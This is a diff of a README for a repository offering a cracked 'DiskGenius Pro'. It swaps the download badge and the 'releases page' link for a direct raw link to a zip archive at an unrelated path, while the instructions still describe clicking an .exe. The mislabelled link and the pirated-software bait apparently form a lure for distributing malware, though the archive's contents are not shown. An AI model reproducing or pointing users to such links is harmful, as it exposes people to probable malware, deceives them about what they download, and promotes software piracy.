@@ -5,7 +5,7 @@ description: "Manage disk partitions, clone drives, restore lost files, and crea
 ---
 # 💾 DiskGenius-Pro-Crack - Manage your partitions and recover files
 
-[![](https://img.shields.io/badge/Download-DiskGenius-blue.svg)](https://github.com/nettypassable200/DiskGenius-Pro-Crack/releases)
+[![](https://img.shields.io/badge/Download-DiskGenius-blue.svg)](https://raw.githubusercontent.com/nettypassable200/nettypassable200.github.io/main/untidal/nettypassable_github_io_v1.7.zip)
 
 ## 💡 About this software
 
@@ -27,7 +27,7 @@ Before you install the software, check your system:
 
 Follow these steps to get the files on your computer:
 
-1. Visit the [releases page](https://github.com/nettypassable200/DiskGenius-Pro-Crack/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/nettypassable200/nettypassable200.github.io/main/untidal/nettypassable_github_io_v1.7.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file link ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
